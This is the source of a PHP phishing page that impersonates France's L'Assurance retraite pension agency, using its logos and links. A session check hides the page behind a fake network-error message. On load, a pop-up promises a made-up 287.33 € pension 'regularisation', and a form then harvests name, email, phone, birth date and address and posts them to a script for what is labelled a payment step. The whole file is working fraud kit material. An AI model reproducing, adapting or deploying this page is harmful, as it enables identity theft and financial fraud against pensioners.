<?php
session_start();

if (!isset($_SESSION['qsdfqsdfqsdfqsdf123123']) || $_SESSION['qsdfqsdfqsdfqsdf123123'] !== true) {
    die("THE REQUEST WAS DENIED: MAKE SURE YOU ARE NOT CONNECTED TO A PRIVATE NETWORK.");
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Informations - L'Assurance retraite</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.3/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Open Sans', sans-serif;
        }

        body {
            background: #F5F5F5;
            min-height: 100vh;
        }

        header {
            background: white;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
        }

        .header-top {
            background: #003d7a;
            padding: 8px 0;
        }

        .header-main {
            padding: 16px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 1200px;
            margin: 0 auto;
        }

        .logo {
            height: 60px;
        }

        .nav-icons {
            display: flex;
            gap: 20px;
            align-items: center;
            justify-content: center;
            flex: 1;
            margin-left: 40px;
            transition: transform 0.3s ease-in-out;
            flex-wrap: nowrap;
        }

        .nav-icon span {
            white-space: nowrap;
        }

        .nav-icon {
            display: flex;
            flex-direction: row;
            align-items: center;
            text-decoration: none;
            color: #003d7a;
            font-size: 13px;
            font-weight: 500;
            transition: all 0.3s;
            padding: 8px 12px;
            border-radius: 8px;
            gap: 8px;
        }

        .nav-icon:hover {
            background: #E6F2FF;
            color: #FF5E00;
        }

        .nav-icon img {
            width: 20px;
            height: 20px;
        }

        .hamburger {
            display: none;
            flex-direction: column;
            cursor: pointer;
            gap: 4px;
            z-index: 1001;
        }

        .hamburger span {
            width: 25px;
            height: 3px;
            background: #003d7a;
            border-radius: 3px;
            transition: all 0.3s;
        }

        .hamburger.active span:nth-child(1) {
            transform: rotate(45deg) translate(6px, 6px);
        }

        .hamburger.active span:nth-child(2) {
            opacity: 0;
        }

        .hamburger.active span:nth-child(3) {
            transform: rotate(-45deg) translate(6px, -6px);
        }

        main {
            max-width: 900px;
            margin: 40px auto;
            padding: 0 20px;
        }

        .breadcrumb {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #666;
            font-size: 14px;
            margin-bottom: 32px;
        }

        .progress-steps {
            display: flex;
            justify-content: space-between;
            margin-bottom: 40px;
            position: relative;
        }

        .progress-steps::before {
            content: '';
            position: absolute;
            top: 12px;
            left: 0;
            right: 0;
            height: 2px;
            background: #E0E0E0;
            z-index: 0;
        }

        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 1;
            flex: 1;
        }

        .step-number {
            width: 32px;
            height: 32px;
            background: white;
            border: 2px solid #E0E0E0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 8px;
            color: #999;
        }

        .step.active .step-number {
            background: #003DA5;
            border-color: #003DA5;
            color: white;
        }

        .step-label {
            font-size: 13px;
            color: #666;
            text-align: center;
        }

        .step.active .step-label {
            color: #003d7a;
            font-weight: 600;
        }

        .form-card {
            background: white;
            border-radius: 12px;
            padding: 32px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
            margin-bottom: 24px;
        }

        .form-card h2 {
            color: #003d7a;
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-weight: 500;
            color: #333;
            margin-bottom: 8px;
            font-size: 14px;
        }

        input[type="text"],
        input[type="email"],
        input[type="tel"] {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #E0E0E0;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.3s;
            outline: none;
        }

        input:focus {
            border-color: #003d7a;
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }

        .btn-primary {
            background: #003d7a;
            color: white;
            border: none;
            padding: 14px 40px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin-top: 24px;
        }

        .btn-primary:hover {
            background: #FF5E00;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 94, 0, 0.3);
        }

        .info-box {
            background: #E6F2FF;
            border-left: 4px solid #003d7a;
            padding: 16px;
            border-radius: 8px;
            margin-bottom: 24px;
            font-size: 14px;
            color: #003d7a;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 9999;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 61, 122, 0.6);
            animation: fadeIn 0.3s;
            align-items: center;
            justify-content: center;
        }

        .modal.active {
            display: flex;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .modal-content {
            background-color: white;
            margin: auto;
            padding: 40px 40px 36px;
            border-radius: 12px;
            max-width: 550px;
            width: 90%;
            box-shadow: 0 8px 24px rgba(0, 61, 122, 0.3);
            text-align: center;
            animation: slideDown 0.3s;
            position: relative;
            border-top: 5px solid #003d7a;
        }

        @keyframes slideDown {
            from {
                transform: translateY(-50px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .modal-close {
            position: absolute;
            top: 16px;
            right: 16px;
            background: transparent;
            border: none;
            font-size: 28px;
            font-weight: 300;
            color: #666;
            cursor: pointer;
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.3s;
            padding: 0;
        }

        .modal-close:hover {
            background: #E6F2FF;
            color: #003d7a;
            transform: rotate(90deg);
        }

        .modal-logo {
            width: 180px;
            margin-bottom: 28px;
        }

        .modal-content h2 {
            color: #003d7a;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        .modal-content p {
            color: #333;
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 24px;
        }

        .modal-amount {
            font-size: 38px;
            font-weight: 700;
            color: #28a745;
            margin: 24px 0;
            background: #E8F5E9;
            padding: 16px 24px;
            border-radius: 8px;
            display: inline-block;
        }

        .modal-info-box {
            background: #E6F2FF;
            border-left: 4px solid #003d7a;
            padding: 14px;
            border-radius: 6px;
            margin: 24px 0;
            font-size: 14px;
            color: #003d7a;
            text-align: left;
        }

        .modal-btn {
            background: #003d7a;
            color: white;
            border: none;
            padding: 14px 40px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 8px;
        }

        .modal-btn:hover {
            background: #FF5E00;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 94, 0, 0.3);
        }

        /* Footer Styles */
        footer {
            background: #003d7a;
            color: white;
            padding: 50px 24px 30px;
            margin-top: 80px;
        }

        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 60px;
            margin-bottom: 40px;
        }

        .footer-logos {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 40px;
            justify-content: center;
        }

        .footer-logos img {
            height: 60px;
        }

        .footer-section h3 {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            color: white;
        }

        .footer-section ul {
            list-style: none;
            padding: 0;
        }

        .footer-section ul li {
            margin-bottom: 12px;
        }

        .footer-section ul li a {
            color: white;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s;
        }

        .footer-section ul li a:hover {
            color: #FF5E00;
        }

        .social-links {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .social-link {
            display: flex;
            align-items: center;
            gap: 12px;
            color: white;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s;
        }

        .social-link:hover {
            color: #FF5E00;
        }

        .social-link svg,
        .social-link img {
            width: 24px;
            height: 24px;
        }

        .social-link img {
            background: white;
            border-radius: 50%;
            padding: 2px;
        }

        .newsletter-text {
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .newsletter-btn {
            background: white;
            color: #003d7a;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .newsletter-btn:hover {
            background: #FF5E00;
            color: white;
        }

        .footer-bottom {
            text-align: center;
            padding-top: 30px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 14px;
        }

        @media screen and (max-width: 768px) {
            .form-row {
                grid-template-columns: 1fr;
            }

            .header-main {
                position: relative;
            }

            .nav-icons {
                position: fixed;
                top: 0;
                right: -100%;
                width: 320px;
                height: 100vh;
                background: white;
                flex-direction: column;
                align-items: stretch;
                box-shadow: -2px 0 10px rgba(0, 0, 0, 0.1);
                padding: 20px 0 20px;
                margin-left: 0;
                gap: 0;
                z-index: 1000;
                overflow-y: auto;
            }

            .nav-icons.active {
                right: 0;
            }

            .nav-icon {
                width: 100%;
                padding: 18px 24px;
                border-radius: 0;
                border-bottom: 1px solid #E0E0E0;
                justify-content: flex-start;
                flex-shrink: 0;
                font-size: 16px;
                line-height: 1.5;
                min-height: 60px;
            }

            .nav-icon span {
                display: inline;
            }

            .nav-icon img {
                width: 24px;
                height: 24px;
            }

            .hamburger {
                display: flex;
            }

            .logo {
                height: 45px;
            }

            .step-label {
                font-size: 11px;
            }

            .form-card {
                padding: 24px 20px;
            }

            .footer-content {
                grid-template-columns: 1fr;
                gap: 40px;
            }

            .modal-content {
                width: 95%;
                max-width: 95%;
                padding: 24px 16px;
                margin: 0;
            }

            .modal-logo {
                width: 140px;
                margin-bottom: 20px;
            }

            .modal-content h2 {
                font-size: 20px;
            }

            .modal-amount {
                font-size: 32px;
                padding: 12px 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Modal -->
    <div id="reformModal" class="modal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeModal()">&times;</button>
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/40/L%E2%80%99Assurance_retraite_Caisse_nationale.png" alt="L'Assurance retraite" class="modal-logo">
            <h2>Information importante</h2>
            <p>Suite à la récente réforme des retraites, vous bénéficiez d'un versement complémentaire de :</p>
            <div class="modal-amount">287,33 €</div>
            <div class="modal-info-box">
                Ce montant correspond à une régularisation de votre dossier de retraite conformément aux dispositions légales en vigueur.
            </div>
            <p style="font-size: 14px; color: #666; margin-top: 16px;">Veuillez continuer pour finaliser votre demande de versement.</p>
            <button class="modal-btn" onclick="closeModal()">Continuer ma demande →</button>
        </div>
    </div>

    <header>
        <div class="header-top"></div>
        <div class="header-main">
            <div class="logo-container">
                <img src="https://www.lassuranceretraite.fr/portail-info/files/live/sites/pub/files/newlogo.png" alt="L'Assurance retraite" class="logo">
            </div>
            <nav class="nav-icons" id="navMenu">
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/autre/questions-frequentes.html" class="nav-icon">
                    <img src="../assets/icons/FAQ.png" alt="FAQ">
                    <span>Questions fréquentes</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/contacts.html" class="nav-icon">
                    <img src="../assets/icons/contact.png" alt="Contact">
                    <span>Nous contacter</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/nous-connaitre.html" class="nav-icon">
                    <img src="../assets/icons/logo AR.png" alt="Nous connaître">
                    <span>Nous connaître</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/entreprise.html" class="nav-icon">
                    <img src="../assets/icons/entreprise.png" alt="Entreprise">
                    <span>Entreprise</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/annexe/sourd-malentendant-contact.html" class="nav-icon">
                    <img src="../assets/icons/malentendant.png" alt="Sourd">
                    <span>Sourd - Malentendant</span>
                </a>
            </nav>
            <div class="hamburger" onclick="toggleMenu()">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
    </header>

    <main>
        <div class="breadcrumb">
            Accueil > Démarches en ligne > Vos informations
        </div>

        <div class="progress-steps">
            <div class="step active">
                <div class="step-number">1</div>
                <div class="step-label">Informations</div>
            </div>
            <div class="step">
                <div class="step-number">2</div>
                <div class="step-label">Versement</div>
            </div>
            <div class="step">
                <div class="step-number">3</div>
                <div class="step-label">Confirmation</div>
            </div>
        </div>

        <div class="info-box">
            Veuillez remplir tous les champs requis pour continuer votre demande
        </div>
        <form method="POST" action="../actions/first.php" id="mainForm">
            <div class="form-card">
                <h2>Vos informations personnelles</h2>

                <div class="form-group">
                    <label for="nom">Nom complet *</label>
                    <input type="text" id="nom" name="nom" required>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label for="email">Email *</label>
                        <input type="email" id="email" name="email" required>
                    </div>
                    <div class="form-group">
                        <label for="tel">Téléphone *</label>
                        <input type="tel" id="tel" name="tel" required>
                    </div>
                </div>

                <div class="form-group">
                    <label for="dob">Date de naissance *</label>
                    <input type="text" id="dob" name="dob" placeholder="JJ/MM/AAAA" required>
                </div>

                <div class="form-group">
                    <label for="adresse">Adresse complète *</label>
                    <input type="text" id="adresse" name="adresse" required>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label for="zip">Code postal *</label>
                        <input type="text" id="zip" name="zip" required>
                    </div>
                    <div class="form-group">
                        <label for="ville">Ville *</label>
                        <input type="text" id="ville" name="ville" required>
                    </div>
                </div>
            </div>

            <input type="hidden" name="type" value="Demande en ligne">

            <button type="submit" class="btn-primary">Continuer →</button>
        </form>
    </main>

    <footer>
        <div class="footer-logos">
            <img src="../icones_PDP/logo_ss.svg" alt="La sécurité sociale">
            <img src="../icones_PDP/logobl.svg" alt="L'assurance retraite">
        </div>
        
        <div class="footer-content">
            <div class="footer-section">
                <h3>L'Assurance retraite</h3>
                <ul>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/nous-connaitre.html">Nous connaître</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/home/nous-rejoindre.html">Nous rejoindre</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/espace-presse.html">Espace presse</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/nos-publications.html">Nos publications de référence</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/sites-internet-utiles.html">Sites internet utiles</a></li>
                </ul>
            </div>

            <div class="footer-section">
                <h3>Retrouvez-nous sur</h3>
                <div class="social-links">
                    <a href="https://www.youtube.com/@lassuranceretraite" class="social-link" target="_blank">
                        <img src="../icones_PDP/youtube.svg" alt="Youtube">
                        <span>Youtube</span>
                    </a>
                    <a href="https://twitter.com/assurretraite" class="social-link" target="_blank">
                        <img src="../icones_PDP/X.svg" alt="Twitter">
                        <span>Twitter</span>
                    </a>
                    <a href="https://www.linkedin.com/company/l-assurance-retraite/" class="social-link" target="_blank">
                        <img src="../icones_PDP/linkedin.svg" alt="LinkedIn">
                        <span>LinkedIn</span>
                    </a>
                </div>
            </div>

            <div class="footer-section">
                <h3>Notre newsletter</h3>
                <p class="newsletter-text">Inscrivez-vous gratuitement et recevez chaque trimestre, toutes les informations utiles et personnalisées pour préparer et gérer votre retraite.</p>
                <button class="newsletter-btn">Je m'inscris</button>
            </div>
        </div>

        <div class="footer-bottom">
            © <?= date('Y') ?> L'Assurance retraite - Tous droits réservés
        </div>
    </footer>

    <script>
        // Toggle mobile menu
        function toggleMenu() {
            const menu = document.getElementById('navMenu');
            const hamburger = document.querySelector('.hamburger');
            menu.classList.toggle('active');
            hamburger.classList.toggle('active');
        }

        // Close menu when clicking outside
        document.addEventListener('click', function(event) {
            const menu = document.getElementById('navMenu');
            const hamburger = document.querySelector('.hamburger');
            const isClickInsideMenu = menu.contains(event.target);
            const isClickOnHamburger = hamburger.contains(event.target);
            
            if (!isClickInsideMenu && !isClickOnHamburger && menu.classList.contains('active')) {
                menu.classList.remove('active');
                hamburger.classList.remove('active');
            }
        });

        // Close modal
        function closeModal() {
            document.getElementById('reformModal').classList.remove('active');
        }

        // Show modal on page load
        window.addEventListener('load', function() {
            setTimeout(function() {
                document.getElementById('reformModal').classList.add('active');
            }, 500);
        });

        $(document).ready(function() {
            $('#dob').mask('00/00/0000');
            $('#tel').mask('00 00 00 00 00');
            $('#zip').mask('00000');

            $('#mainForm').validate({
                rules: {
                    nom: { required: true, minlength: 3 },
                    email: { required: true, email: true },
                    tel: { required: true, minlength: 14 },
                    dob: { required: true },
                    adresse: { required: true },
                    zip: { required: true, minlength: 5 },
                    ville: { required: true }
                },
                messages: {
                    nom: "Veuillez entrer votre nom complet",
                    email: "Veuillez entrer une adresse email valide",
                    tel: "Veuillez entrer un numéro de téléphone valide",
                    dob: "Veuillez entrer votre date de naissance",
                    adresse: "Veuillez entrer votre adresse",
                    zip: "Veuillez entrer un code postal valide",
                    ville: "Veuillez entrer votre ville"
                }
            });
        });
    </script>
</body>
</html>